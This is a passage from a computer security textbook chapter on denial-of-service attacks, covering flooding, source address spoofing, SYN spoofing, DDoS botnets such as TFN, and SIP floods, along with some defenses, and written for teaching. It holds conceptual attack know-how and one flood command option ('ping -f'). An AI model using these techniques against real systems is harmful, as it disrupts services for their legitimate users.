\\r\\nhindering or blocking completely the provision of some service. The attack attempts \\r\\nto exhaust some critical resource associated with the service. An example is flood\\ufffeing a Web server with so many spurious requests that it is unable to respond to \\r\\nvalid requests from users in a timely manner. This chapter explores denial-of-service \\r\\nattacks, their definition, the various forms they take, and defenses against them.\\r\\n7.1 DENIAL-OF-SERVICE ATTACKS\\r\\nThe temporary takedown in December 2010 of a handful of websites that cut ties \\r\\nwith controversial website WikiLeaks, including Visa and MasterCard, made world\\ufffewide news. Similar attacks, motivated by a variety of reasons, occur thousands of \\r\\ntimes each day, thanks in part to the ease by which website disruptions can be \\r\\naccomplished.\\r\\nHackers have been carrying out distributed denial-of-service (DDoS) attacks \\r\\nfor many years, and their potency steadily has increased over time. Due to Internet \\r\\nbandwidth growth, the largest such attacks have increased from a modest 400 Mbps \\r\\nin 2002, to 100 Gbps in 2010 [ARBO10], to 300 Gbps in the Spamhaus attack in 2013, \\r\\nand to 600 Gbps in the BBC attack in 2015. Massive flooding attacks in the 50 Gbps \\r\\nrange are powerful enough to exceed the bandwidth capacity of almost any intended \\r\\ntarget, including perhaps the core Internet Exchanges or critical DNS name servers, \\r\\nbut even smaller attacks can be surprisingly effective. [SYMA16] notes that DDoS \\r\\nattacks are growing in number and intensity, but that most last for 30 minutes or less, \\r\\ndriven by the use of botnets-for-hire. The reasons for attacks include financial extor\\ufffetion, hacktivism, and state-sponsored attacks on opponents. There are also reports of \\r\\ncriminals using DDoS attacks on bank systems as a diversion from the real attack on \\r\\ntheir payment switches or ATM networks. These attacks remain popular as they are \\r\\nsimple to setup, difficult to stop, and very effective [SYMA16].\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Explain the basic concept of a denial-of-service attack.\\r\\n◆ Understand the nature of flooding attacks.\\r\\n◆ Describe distributed denial-of-service attacks.\\r\\n◆ Explain the concept of an application-based bandwidth attack and give some \\r\\nexamples.\\r\\n◆ Present an overview of reflector and amplifier attacks.\\r\\n◆ Summarize some of the common defenses against denial-of-service attacks.\\r\\n◆ Summarize common responses to denial-of-service attacks.\\r\\nM07_STAL0611_04_GE_C07.indd 247 10/11/17 2:54 PM\\n\\n\\n248 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nA DDoS attack in October 2016 represents an ominous new trend in the threat. \\r\\nThis attack, on Dyn, a major Domain Name System (DNS) service provider, lasted \\r\\nfor many hours and involved multiple waves of attacks from over 100,000 malicious \\r\\nendpoints. The noteworthy feature of this attack is that the attack source recruited \\r\\nIoT (Internet of Things) devices, such as webcams and baby monitors. One estimate \\r\\nof the volume of attack traffic is that it reached a peak as high as 1.2 TBps [LOSH16].\\r\\nThe Nature of Denial-of-Service Attacks\\r\\nDenial of service is a form of attack on the availability of some service. In the context \\r\\nof computer and communications security, the focus is generally on network services \\r\\nthat are attacked over their network connection. We distinguish this form of attack \\r\\non availability from other attacks, such as the classic acts of god, that cause damage \\r\\nor destruction of IT infrastructure and consequent loss of service.\\r\\nNIST SP 800-61 (Computer Security Incident Handling Guide, August 2012) \\r\\ndefines denial-of-service (DoS) attack as follows:\\r\\nA denial of service (DoS) is an action that prevents or impairs the authorized \\r\\nuse of networks, systems, or applications by exhausting resources such as central \\r\\nprocessing units (CPU), memory, bandwidth, and disk space.\\r\\nFrom this definition, you can see there are several categories of resources that \\r\\ncould be attacked:\\r\\n• Network bandwidth\\r\\n• System resources\\r\\n• Application resources\\r\\nNetwork bandwidth relates to the capacity of the network links connecting a server \\r\\nto the wider Internet. For most organizations, this is their connection to their Inter\\ufffenet service provider (ISP), as shown in the example network in Figure 7.1. Usually \\r\\nthis connection will have a lower capacity than the links within and between ISP \\r\\nrouters. This means that it is possible for more traffic to arrive at the ISP’s routers \\r\\nover these higher-capacity links than to be carried over the link to the organization. \\r\\nIn this circumstance, the router must discard some packets, delivering only as many \\r\\nas can be handled by the link. In normal network operation, such high loads might \\r\\noccur to a popular server experiencing traffic from a large number of legitimate users. \\r\\nA random portion of these users will experience a degraded or nonexistent service \\r\\nas a consequence. This is expected behavior for an overloaded TCP/IP network link. \\r\\nIn a DoS attack, the vast majority of traffic directed at the target server is mali\\ufffecious, generated either directly or indirectly by the attacker. This traffic overwhelms \\r\\nany legitimate traffic, effectively denying legitimate users access to the server. Some \\r\\nrecent high volume attacks have even been directed at the ISP network support\\ufffeing the target organization, aiming to disrupt its connections to other networks. A \\r\\nnumber of DDoS attacks are listed in [AROR11], with comments on their growth \\r\\nin volume and impact.\\r\\nM07_STAL0611_04_GE_C07.indd 248 10/11/17 2:54 PM\\n\\n\\n7.1 / DENIAL-OF-SERVICE ATTACKS 249\\r\\nA DoS attack targeting system resources typically aims to overload or crash its \\r\\nnetwork handling software. Rather than consuming bandwidth with large volumes of \\r\\ntraffic, specific types of packets are sent that consume the limited resources available \\r\\non the system. These include temporary buffers used to hold arriving packets, tables \\r\\nof open connections, and similar memory data structures. The SYN spoofing attack, \\r\\nwhich we will discuss shortly, is of this type. It targets the table of TCP connections \\r\\non the server.\\r\\nAnother form of system resource attack uses packets whose structure triggers \\r\\na bug in the system’s network handling software, causing it to crash. This means the \\r\\nsystem can no longer communicate over the network until this software is reloaded, \\r\\ngenerally by rebooting the target system. This is known as a poison packet. The clas\\ufffesic ping of death and teardrop attacks, directed at older Windows 9x systems, were \\r\\nof this form. These targeted bugs in the Windows network code that handled ICMP \\r\\n(Internet Control Message Protocol) echo request packets and packet fragmentation, \\r\\nrespectively.\\r\\nAn attack on a specific application, such as a Web server, typically involves a \\r\\nnumber of valid requests, each of which consumes significant resources. This then \\r\\nlimits the ability of the server to respond to requests from other users. For example, \\r\\na Web server might include the ability to make database queries. If a large, costly \\r\\nFigure 7.1 Example Network to Illustrate DoS Attacks\\r\\nMedium size company\\r\\nLAN\\r\\nWeb server\\r\\nLAN PCs\\r\\nand workstations\\r\\nBroadband\\r\\nsubscribers\\r\\nBroadband\\r\\nusers\\r\\nInternet service\\r\\nprovider (ISP) A\\r\\nInternet\\r\\nRouter\\r\\nLarge company LAN\\r\\nBroadband\\r\\nusers\\r\\nInternet service\\r\\nprovider (ISP) B Broadband\\r\\nsubscribers\\r\\nWeb server\\r\\nM07_STAL0611_04_GE_C07.indd 249 10/11/17 2:54 PM\\n\\n\\n250 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nquery can be constructed, then an attacker could generate a large number of these \\r\\nthat severely load the server. This limits its ability to respond to valid requests from \\r\\nother users. This type of attack is known as a cyberslam. [KAND05] discusses attacks \\r\\nof this kind, and suggests some possible countermeasures. Another alternative is to \\r\\nconstruct a request that triggers a bug in the server program, causing it to crash. This \\r\\nmeans the server is no longer able to respond to requests until it is restarted.\\r\\nDoS attacks may also be characterized by how many systems are used to direct \\r\\ntraffic at the target system. Originally only one, or a small number of source systems \\r\\ndirectly under the attacker’s control, was used. This is all that is required to send the \\r\\npackets needed for any attack targeting a bug in a server’s network handling code \\r\\nor some application. Attacks requiring high traffic volumes are more commonly sent \\r\\nfrom multiple systems at the same time, using distributed or amplified forms of DoS \\r\\nattacks. We will discuss these later in this chapter.\\r\\nClassic Denial-of-Service Attacks\\r\\nThe simplest classical DoS attack is a flooding attack on an organization. The aim of \\r\\nthis attack is to overwhelm the capacity of the network connection to the target \\r\\norganization. If the attacker has access to a system with a higher-capacity network \\r\\nconnection, then this system can likely generate a higher volume of traffic than the \\r\\nlower-capacity target connection can handle. For example, in the network shown in \\r\\nFigure 7.1, the attacker might use the large company’s Web server to target the \\r\\nmedium-sized company with a lower-capacity network connection. The attack might \\r\\nbe as simple as using a flooding ping1\\r\\n command directed at the Web server in the \\r\\ntarget company. This traffic can be handled by the higher-capacity links on the path \\r\\nbetween them, until the final router in the Internet cloud is reached. At this point, \\r\\nsome packets must be discarded, with the remainder consuming most of the capacity \\r\\non the link to the medium-sized company. Other valid traffic will have little chance \\r\\nof surviving discard as the router responds to the resulting congestion on this link.\\r\\nIn this classic ping flood attack, the source of the attack is clearly identified \\r\\nsince its address is used as the source address in the ICMP echo request packets. This \\r\\nhas two disadvantages from the attacker’s perspective. First, the source of the attack \\r\\nis explicitly identified, increasing the chance that the attacker can be identified and \\r\\nlegal action taken in response. Second, the targeted system will attempt to respond \\r\\nto the packets being sent. In the case of any ICMP echo request packets received by \\r\\nthe server, it would respond to each with an ICMP echo response packet directed \\r\\nback to the sender. This effectively reflects the attack back at the source system. Since \\r\\nthe source system has a higher network bandwidth, it is more likely to survive this \\r\\nreflected attack. However, its network performance will be noticeably affected, again \\r\\nincreasing the chances of the attack being detected and action taken in response. For \\r\\nboth of these reasons, the attacker would like to hide the identity of the source system. \\r\\nThis means that any such attack packets need to use a falsified, or spoofed, address.\\r\\n1\\r\\nThe diagnostic “ping” command is a common network utility used to test connectivity to the specified \\r\\ndestination. It sends TCP/IP ICMP echo request packets to the destination, and measures the time taken \\r\\nfor the echo response packet to return, if at all. Usually these packets are sent at a controlled rate; however, \\r\\nthe flood option specifies that they should be sent as fast as possible. This is usually specified as “ping –f”.\\r\\nM07_STAL0611_04_GE_C07.indd 250 10/11/17 2:54 PM\\n\\n\\n7.1 / DENIAL-OF-SERVICE ATTACKS 251\\r\\nSource Address Spoofing\\r\\nA common characteristic of packets used in many types of DoS attacks is the use of \\r\\nforged source addresses. This is known as source address spoofing. Given sufficiently \\r\\nprivileged access to the network handling code on a computer system, it is easy to \\r\\ncreate packets with a forged source address (and indeed any other attribute that is \\r\\ndesired). This type of access is usually via the raw socket interface on many operating \\r\\nsystems. This interface was provided for custom network testing and research into \\r\\nnetwork protocols. It is not needed for normal network operation. However, for \\r\\nreasons of historical compatibility and inertia, this interface has been maintained \\r\\nin many current operating systems. Having this standard interface available greatly \\r\\neases the task of any attacker trying to generate packets with forged attributes. \\r\\nOtherwise, an attacker would most likely need to install a custom device driver on \\r\\nthe source system to obtain this level of access to the network, which is much more \\r\\nerror prone and dependent on operating system version.\\r\\nGiven raw access to the network interface, the attacker now generates large \\r\\nvolumes of packets. These would all have the target system as the destination address \\r\\nbut would use randomly selected, usually different, source addresses for each packet. \\r\\nConsider the flooding ping example from the previous section. These custom ICMP \\r\\necho request packets would flow over the same path from the source toward the \\r\\ntarget system. The same congestion would result in the router connected to the final \\r\\nlower-capacity link. However, the ICMP echo response packets, generated in response \\r\\nto those packets reaching the target system, would no longer be reflected back to the \\r\\nsource system. Rather they would be scattered across the Internet to all the various \\r\\nforged source addresses. Some of these addresses might correspond to real systems. \\r\\nThese might respond with some form of error packet, since they were not expecting \\r\\nto see the response packet received. This only adds to the flood of traffic directed at \\r\\nthe target system. Some of the addresses may not be used or may not be reachable. \\r\\nFor these, ICMP destination unreachable packets might be sent back. Or these pack\\ufffeets might simply be discarded.2\\r\\n Any response packets returned only add to the flood \\r\\nof traffic directed at the target system.\\r\\nIn addition, the use of packets with forged source addresses means the attack\\ufffeing system is much harder to identify. The attack packets seem to have originated at \\r\\naddresses scattered across the Internet. Hence, just inspecting each packet’s header \\r\\nis not sufficient to identify its source. Rather the flow of packets of some specific \\r\\nform through the routers along the path from the source to the target system must \\r\\nbe identified. This requires the cooperation of the network engineers managing all \\r\\nthese routers and is a much harder task than simply reading off the source address. It \\r\\nis not a task that can be automatically requested by the packet recipients. Rather it \\r\\nusually requires the network engineers to specifically query flow information from \\r\\ntheir routers. This is a manual process that takes time and effort to organize.\\r\\nIt is worth considering why such easy forgery of source addresses is allowed on \\r\\nthe Internet. It dates back to the development of TCP/IP, which occurred in a gener\\ufffeally cooperative, trusting environment. TCP/IP simply does not include the ability, by \\r\\ndefault, to ensure that the source address in a packet really does correspond with that \\r\\n2\\r\\nICMP packets created in response to other ICMP packets are typically the first to be discarded.\\r\\nM07_STAL0611_04_GE_C07.indd 251 10/11/17 2:54 PM\\n\\n\\n252 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nof the originating system. It is possible to impose filtering on routers to ensure this \\r\\n(or at least that source network address is valid). However, this filtering3\\r\\n needs to be \\r\\nimposed as close to the originating system as possible, where the knowledge of valid \\r\\nsource addresses is as accurate as possible. In general, this should occur at the point \\r\\nwhere an organization’s network connects to the wider Internet, at the borders of the \\r\\nISP’s providing this connection. Despite this being a long-standing security recom\\ufffemendation to combat problems such as DoS attacks, for example (RFC 2827), many \\r\\nISPs do not implement such filtering. As a consequence, attacks using spoofed-source \\r\\npackets continue to occur frequently.\\r\\nThere is a useful side effect of this scattering of response packets to some \\r\\noriginal flow of spoofed-source packets. Security researchers, such as those with the \\r\\nHoneynet Project, have taken blocks of unused IP addresses, advertised routes to \\r\\nthem, then collected details of any packets sent to these addresses. Since no real \\r\\nsystems use these addresses, no legitimate packets should be directed to them. Any \\r\\npackets received might simply be corrupted. It is much more likely, though, that they \\r\\nare the direct or indirect result of network attacks. The ICMP echo response packets \\r\\ngenerated in response to a ping flood using randomly spoofed source addresses is a \\r\\ngood example. This is known as backscatter traffic. Monitoring the type of packets \\r\\ngives valuable information on the type and scale of attacks being used, as described \\r\\nby [MOOR06], for example. This information is being used to develop responses to \\r\\nthe attacks seen.\\r\\nSYN Spoofing\\r\\nAlong with the basic flooding attack, the other common classic DoS attack is the \\r\\nSYN spoofing attack. This attacks the ability of a network server to respond to TCP \\r\\nconnection requests by overflowing the tables used to manage such connections. This \\r\\nmeans future connection requests from legitimate users fail, denying them access to \\r\\nthe server. It is thus an attack on system resources, specifically the network handling \\r\\ncode in the operating system.\\r\\nTo understand the operation of these attacks, we need to review the three-way \\r\\nhandshake that TCP uses to establish a connection. This is illustrated in Figure 7.2. The \\r\\nclient system initiates the request for a TCP connection by sending a SYN packet to \\r\\nthe server. This identifies the client’s address and port number and supplies an initial \\r\\nsequence number. It may also include a request for other TCP options. The server \\r\\nrecords all the details about this request in a table of known TCP connections. It then \\r\\nresponds to the client with a SYN-ACK packet. This includes a sequence number \\r\\nfor the server and increments the client’s sequence number to confirm receipt of the \\r\\nSYN packet. Once the client receives this, it sends an ACK packet to the server with \\r\\nan incremented server sequence number and marks the connection as established. \\r\\nSimilarly, when the server receives this ACK packet, it also marks the connection as \\r\\nestablished. Either party may then proceed with data transfer. In practice, this ideal \\r\\nexchange sometimes fails. These packets are transported using IP, which is an unreli\\ufffeable, though best-effort, network protocol. Any of the packets might be lost in transit, \\r\\nas a result of congestion, for example. Hence both the client and server keep track \\r\\n3\\r\\nThis is known as “egress filtering.”\\r\\nM07_STAL0611_04_GE_C07.indd 252 10/11/17 2:54 PM\\n\\n\\n7.1 / DENIAL-OF-SERVICE ATTACKS 253\\r\\nof which packets they have sent and, if no response is received in a reasonable time, \\r\\nwill resend those packets. As a result, TCP is a reliable transport protocol, and any \\r\\napplications using it need not concern themselves with problems of lost or reordered \\r\\npackets. This does, however, impose an overhead on the systems in managing this \\r\\nreliable transfer of packets.\\r\\nA SYN spoofing attack exploits this behavior on the targeted server system. The \\r\\nattacker generates a number of SYN connection request packets with forged source \\r\\naddresses. For each of these, the server records the details of the TCP connection \\r\\nrequest and sends the SYN-ACK packet to the claimed source address, as shown in \\r\\nFigure 7.3. If there is a valid system at this address, it will respond with a RST (reset) \\r\\npacket to cancel this unknown connection request. When the server receives this \\r\\npacket, it cancels the connection request and removes the saved information. How\\ufffeever, if the source system is too busy, or there is no system at the forged address, then \\r\\nno reply will return. In these cases, the server will resend the SYN-ACK packet a \\r\\nnumber of times before finally assuming the connection request has failed and delet\\ufffeing the information saved concerning it. In this period between when the original \\r\\nSYN packet is received and when the server assumes the request has failed, the server \\r\\nis using an entry in its table of known TCP connections. This table is typically sized on \\r\\nthe assumption that most connection requests quickly succeed and that a reasonable \\r\\nnumber of requests may be handled simultaneously. However, in a SYN spoofing \\r\\nattack, the attacker directs a very large number of forged connection requests at the \\r\\ntargeted server. These rapidly fill the table of known TCP connections on the server. \\r\\nOnce this table is full, any future requests, including legitimate requests from other \\r\\nusers, are rejected. The table entries will time out and be removed, which in normal \\r\\nFigure 7.2 TCP Three-Way Connection Handshake\\r\\nClient Server\\r\\n1\\r\\n2\\r\\n3\\r\\nSend SYN\\r\\n(seq = x) Receive SYN\\r\\n(seq = x)\\r\\nReceive SYN-ACK\\r\\n(seq = y, ack = x + 1)\\r\\nSend SYN-ACK\\r\\n(seq = y, ack = x + 1)\\r\\nSend ACK\\r\\n(ack = y + 1) Receive ACK\\r\\n(ack = y + 1)\\r\\nM07_STAL0611_04_GE_C07.indd 253 10/11/17 2:54 PM\\n\\n\\n254 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nnetwork usage corrects temporary overflow problems. However, if the attacker keeps \\r\\na sufficient volume of forged requests flowing, this table will be constantly full and \\r\\nthe server will be effectively cut off from the Internet, unable to respond to most \\r\\nlegitimate connection requests.\\r\\nIn order to increase the usage of the known TCP connections table, the attacker \\r\\nideally wishes to use addresses that will not respond to the SYN-ACK with a RST. \\r\\nThis can be done by overloading the host that owns the chosen spoofed source \\r\\naddress, or by simply using a wide range of random addresses. In this case, the attacker \\r\\nrelies on the fact that there are many unused addresses on the Internet. Consequently, \\r\\na reasonable proportion of randomly generated addresses will not correspond to a \\r\\nreal host.\\r\\nThere is a significant difference in the volume of network traffic between a SYN \\r\\nspoof attack and the basic flooding attack we discussed. The actual volume of SYN \\r\\ntraffic can be comparatively low, nowhere near the maximum capacity of the link to \\r\\nthe server. It simply has to be high enough to keep the known TCP connections table \\r\\nfilled. Unlike the flooding attack, this means the attacker does not need access to a \\r\\nhigh-volume network connection. In the network shown in Figure 7.1, the medium\\ufffesized organization, or even a broadband home user, could successfully attack the large \\r\\ncompany server using a SYN spoofing attack.\\r\\nA flood of packets from a single server, or a SYN spoofing attack originating on \\r\\na single system, were probably the two most common early forms of DoS attacks. In \\r\\nthe case of a flooding attack, this was a significant limitation, and attacks evolved to \\r\\nFigure 7.3 TCP SYN SpoofingAttack\\r\\n1\\r\\n2\\r\\nAttacker Server Spoofed client\\r\\nSYN-ACK’s to\\r\\nnon existent client\\r\\ndiscarded\\r\\nSend SYN\\r\\nwith spoofed src\\r\\n(seq = x)\\r\\nSend SYN-ACK\\r\\n(seq = y, ack = x + 1)\\r\\nResend SYN-ACK\\r\\nafter timeouts\\r\\nAssume failed\\r\\nconnection\\r\\nrequest\\r\\nM07_STAL0611_04_GE_C07.indd 254 10/11/17 2:54 PM\\n\\n\\n7.2 / FLOODING ATTACKS 255\\r\\nuse multiple systems to increase their effectiveness. We next examine in more detail \\r\\nsome of the variants of a flooding attack. These can be launched either from a single \\r\\nor multiple systems, using a range of mechanisms, which we explore.\\r\\n7.2 FLOODING ATTACKS\\r\\nFlooding attacks take a variety of forms, based on which network protocol is being \\r\\nused to implement the attack. In all cases, the intent is generally to overload the \\r\\nnetwork capacity on some link to a server. The attack may alternatively aim to over\\ufffeload the server’s ability to handle and respond to this traffic. These attacks flood the \\r\\nnetwork link to the server with a torrent of malicious packets competing with, and \\r\\nusually overwhelming, valid traffic flowing to the server. In response to the conges\\ufffetion, this causes in some routers on the path to the targeted server, many packets \\r\\nwill be dropped. Valid traffic has a low probability of surviving discard caused by this \\r\\nflood, and hence of accessing the server. This results in the server’s ability to respond \\r\\nto network connection requests being either severely degraded or failing entirely.\\r\\nVirtually any type of network packet can be used in a flooding attack. It simply \\r\\nneeds to be of a type that is permitted to flow over the links toward the targeted sys\\ufffetem, so it can consume all available capacity on some link to the target server. Indeed, \\r\\nthe larger the packet is, the more effective will be the attack. Common flooding attacks \\r\\nuse any of the ICMP, UDP, or TCP SYN packet types. It is even possible to flood with \\r\\nsome other IP packet type. However, as these are less common and their usage more \\r\\ntargeted, it is easier to filter for them and hence hinder or block such attacks.\\r\\nICMP Flood\\r\\nThe ping flood using ICMP echo request packets we discussed in Section 7.1 is a clas\\ufffesic example of an ICMP flooding attack. This type of ICMP packet was chosen since \\r\\ntraditionally network administrators allowed such packets into their networks, as ping \\r\\nis a useful network diagnostic tool. More recently, many organizations have restricted \\r\\nthe ability of these packets to pass through their firewalls. In response, attackers have \\r\\nstarted using other ICMP packet types. Since some of these should be handled to allow \\r\\nthe correct operation of TCP/IP, they are much more likely to be allowed through \\r\\nan organization’s firewall. Filtering some of these critical ICMP packet types would \\r\\ndegrade or break normal TCP/IP network behavior. ICMP destination unreachable \\r\\nand time exceeded packets are examples of such critical packet types.\\r\\nAn attacker can generate large volumes of one of these packet types. Because \\r\\nthese packets include part of some notional erroneous packet that supposedly caused \\r\\nthe error being reported, they can be made comparatively large, increasing their effec\\ufffetiveness in flooding the link. ICMP flood attacks remain one of the most common \\r\\ntypes of DDoS attacks [SYMA16].\\r\\nUDP Flood\\r\\nAn alternative to using ICMP packets is to use UDP packets directed to some port \\r\\nnumber, and hence potential service, on the target system. A common choice was a \\r\\npacket directed at the diagnostic echo service, commonly enabled on many server \\r\\nM07_STAL0611_04_GE_C07.indd 255 10/11/17 2:54 PM\\n\\n\\n256 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nsystems by default. If the server had this service running, it would respond with a \\r\\nUDP packet back to the claimed source containing the original packet data contents. \\r\\nIf the service is not running, then the packet is discarded, and possibly an ICMP des\\ufffetination unreachable packet is returned to the sender. By then the attack has already \\r\\nachieved its goal of occupying capacity on the link to the server. Just about any UDP \\r\\nport number can be used for this end. Any packets generated in response only serve \\r\\nto increase the load on the server and its network links.\\r\\nSpoofed source addresses are normally used if the attack is generated using a \\r\\nsingle source system, for the same reasons as with ICMP attacks. If multiple systems \\r\\nare used for the attack, often the real addresses of the compromised, zombie, systems \\r\\nare used. When multiple systems are used, the consequences of both the reflected \\r\\nflow of packets and the ability to identify the attacker are reduced.\\r\\nTCP SYN Flood\\r\\nAnother alternative is to send TCP packets to the target system. Most likely these \\r\\nwould be normal TCP connection requests, with either real or spoofed source \\r\\naddresses. They would have an effect similar to the SYN spoofing attack we have \\r\\ndescribed. In this case, though, it is the total volume of packets that is the aim of the \\r\\nattack rather than the system code. This is the difference between a SYN spoofing \\r\\nattack and a SYN flooding attack.\\r\\nThis attack could also use TCP data packets, which would be rejected by the \\r\\nserver as not belonging to any known connection. But again, by this time, the attack \\r\\nhas already succeeded in flooding the links to the server.\\r\\nAll of these flooding attack variants are limited in the total volume of traffic \\r\\nthat can be generated if just a single system is used to launch the attack. The use of \\r\\na single system also means the attacker is easier to trace. For these reasons, a variety \\r\\nof more sophisticated attacks, involving multiple attacking systems, have been devel\\ufffeoped. By using multiple systems, the attacker can significantly scale up the volume of \\r\\ntraffic that can be generated. Each of these systems need not be particularly powerful \\r\\nor on a high-capacity link. But what they do not have individually, they more than \\r\\ncompensate for in large numbers. In addition, by directing the attack through inter\\ufffemediaries, the attacker is further distanced from the target and significantly harder to \\r\\nlocate and identify. Indirect attack types that utilize multiple systems include:\\r\\n• Distributed denial-of-service attacks.\\r\\n• Reflector attacks.\\r\\n• Amplifier attacks.\\r\\nWe will consider each of these in turn.\\r\\n7.3 DISTRIBUTED DENIAL-OF-SERVICE ATTACKS\\r\\nRecognizing the limitations of flooding attacks generated by a single system, one \\r\\nof the earlier significant developments in DoS attack tools was the use of multiple \\r\\nsystems to generate attacks. These systems were typically compromised user worksta\\ufffetions or PCs. The attacker uses malware to subvert the system and to install an attack \\r\\nM07_STAL0611_04_GE_C07.indd 256 10/11/17 2:54 PM\\n\\n\\n7.3 / DISTRIBUTED DENIAL-OF-SERVICE ATTACKS 257\\r\\nagent, which they can control. Such systems are known as zombies. Large collections \\r\\nof such systems under the control of one attacker can be created, collectively form\\ufffeing a botnet, as we discussed in Chapter 6. Such networks of compromised systems \\r\\nare a favorite tool of attackers, and can be used for a variety of purposes, includ\\ufffeing distributed denial-of-service (DDoS) attacks. Indeed, there is an underground \\r\\neconomy that creates and hires out botnets for use in such attacks. [SYMA16] report \\r\\nevidence that 40% of DDoS attacks in 2015 were from such botnets for hire. In the \\r\\nexample network shown in Figure 7.1, some of the broadband user systems may be \\r\\ncompromised and used as zombies to attack any of the company or other links shown.\\r\\nWhile the attacker could command each zombie individually, more generally \\r\\na control hierarchy is used. A small number of systems act as handlers controlling a \\r\\nmuch larger number of agent systems, as shown in Figure 7.4. There are a number of \\r\\nadvantages to this arrangement. The attacker can send a single command to a handler, \\r\\nwhich then automatically forwards it to all the agents under its control. Automated \\r\\ninfection tools can also be used to scan for and compromise suitable zombie systems, \\r\\nas we discussed in Chapter 6. Once the agent software is uploaded to a newly com\\ufffepromised system, it can contact one or more handlers to automatically notify them \\r\\nof its availability. By this means, the attacker can automatically grow suitable botnets.\\r\\nOne of the earliest and best-known DDoS tools is Tribe Flood Network (TFN), \\r\\nwritten by the hacker known as Mixter. The original variant from the 1990s exploited \\r\\nSun Solaris systems. It was later rewritten as Tribe Flood Network 2000 (TFN2K) and \\r\\ncould run on UNIX, Solaris, and Windows NT systems. TFN and TFN2K use a ver\\ufffesion of the two-layer command hierarchy shown in Figure 7.4. The agent was a Trojan \\r\\nprogram that was copied to and run on compromised, zombie systems. It was capable \\r\\nof implementing ICMP flood, SYN flood, UDP flood, and ICMP amplification forms \\r\\nof DoS attacks. TFN did not spoof source addresses in the attack packets. Rather, it \\r\\nFigure 7.4 DDoS Attack Architecture\\r\\nAttacker\\r\\nHandler\\r\\nzombies\\r\\nAgent\\r\\nzombies\\r\\nTarget\\r\\nM07_STAL0611_04_GE_C07.indd 257 10/11/17 2:54 PM\\n\\n\\n258 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nrelied on a large number of compromised systems, and the layered command struc\\ufffeture, to obscure the path back to the attacker. The agent also implemented some other \\r\\nrootkit functions as we described in Chapter 6. The handler was simply a command\\ufffeline program run on some compromised systems. The attacker accessed these systems \\r\\nusing any suitable mechanism giving shell access, and then ran the handler program \\r\\nwith the desired options. Each handler could control a large number of agent sys\\ufffetems, identified using a supplied list. Communications between the handler and its \\r\\nagents was encrypted and could be intermixed with a number of decoy packets. This \\r\\nhindered attempts to monitor and analyze the control traffic. Both these communica\\ufffetions and the attacks themselves could be sent via randomized TCP, UDP, and ICMP \\r\\npackets. This tool demonstrates the typical capabilities of a DDoS attack system.\\r\\nMany other DDoS tools have been developed since. Instead of using dedicated \\r\\nhandler programs, many now use an IRC4\\r\\n or similar instant messaging server pro\\ufffegram, or Web-based HTTP servers, to manage communications with the agents. Many \\r\\nof these more recent tools also use cryptographic mechanisms to authenticate the \\r\\nagents to the handlers, in order to hinder analysis of command traffic.\\r\\nThe best defense against being an unwitting participant in a DDoS attack is to \\r\\nprevent your systems from being compromised. This requires good system security \\r\\npractices and keeping the operating systems and applications on such systems cur\\uffferent and patched.\\r\\nFor the target of a DDoS attack, the response is the same as for any flooding \\r\\nattack, but with greater volume and complexity. We will discuss appropriate defenses \\r\\nand responses in Sections 7.6 and 7.7.\\r\\n7.4 APPLICATION-BASED BANDWIDTH ATTACKS\\r\\nA potentially effective strategy for denial of service is to force the target to execute \\r\\nresource-consuming operations that are disproportionate to the attack effort. For \\r\\nexample, websites may engage in lengthy operations such as searches, in response to \\r\\na simple request. Application-based bandwidth attacks attempt to take advantage of \\r\\nthe disproportionally large resource consumption at a server. In this section, we look \\r\\nat two protocols that can be used for such attacks.\\r\\nSIP Flood\\r\\nVoice over IP (VoIP) telephony is now widely deployed over the Internet. The stan\\ufffedard protocol used for call setup in VoIP is the Session Initiation Protocol (SIP). SIP \\r\\nis a text-based protocol with a syntax similar to that of HTTP. There are two different \\r\\ntypes of SIP messages: requests and responses. Figure 7.5 is a simplified illustration \\r\\nof the operation of the SIP INVITE message, used to establish a media session \\r\\nbetween user agents. In this case, Alice’s user agent runs on a computer, and Bob’s \\r\\n4\\r\\nInternet Relay Chat (IRC) was one of the earlier instant messaging systems developed, with a number \\r\\nof open source server implementations. It is a popular choice for attackers to use and modify as a handler \\r\\nprogram able to control large numbers of agents. Using the standard chat mechanisms, the attacker can \\r\\nsend a message that is relayed to all agents connected to that channel on the server. Alternatively, the \\r\\nmessage may be directed to just one or a defined group of agents.\\r\\nM07_STAL0611_04_GE_C07.indd 258 10/11/17 2:54 PM\\n\\n\\n7.4 / APPLICATION-BASED BANDWIDTH ATTACKS 259\\r\\nuser agent runs on a cell phone. Alice’s user agent is configured to communicate with \\r\\na proxy server (the outbound server) in its domain and begins by sending an INVITE \\r\\nSIP request to the proxy server that indicates its desire to invite Bob’s user agent into \\r\\na session. The proxy server uses a DNS server to get the address of Bob’s proxy \\r\\nserver, then forwards the INVITE request to that server. The server then forwards \\r\\nthe request to Bob’s user agent, causing Bob’s phone to ring.5\\r\\nA SIP flood attack exploits the fact that a single INVITE request triggers con\\ufffesiderable resource consumption. The attacker can flood a SIP proxy with numerous \\r\\nINVITE requests with spoofed IP addresses, or alternately a DDoS attack using a \\r\\nbotnet to generate numerous INVITE request. This attack puts a load on the SIP \\r\\nproxy servers in two ways. First, their server resources are depleted in processing the \\r\\nINVITE requests. Second, their network capacity is consumed. Call receivers are also \\r\\nvictims of this attack. A target system will be flooded with forged VoIP calls, making \\r\\nthe system unavailable for legitimate incoming calls.\\r\\n5\\r\\nSee [STAL14] for a more detailed description of SIP operation.\\r\\nFigure 7.5 SIP INVITE Scenario\\r\\nReturns IP\\r\\naddress of Bob’s\\r\\nproxy server\\r\\nDNS\\r\\nserver\\r\\nUser agent Alice User agent Bob\\r\\nProxy\\r\\nserver\\r\\nProxy\\r\\nserver\\r\\nInternet\\r\\nWireless\\r\\nnetwork\\r\\nLAN\\r\\nINVITE sip:bob@biloxi.com\\r\\nFrom: sip:alice@atlanta.com\\r\\nINVITE sip:bob@biloxi.com\\r\\nFrom: sip:alice@atlanta.com\\r\\nINVITE sip:bob@biloxi.com\\r\\nFrom: sip:alice@atlanta.com\\r\\n1\\r\\n3 2\\r\\n4\\r\\n5\\r\\n DNS query:\\r\\n 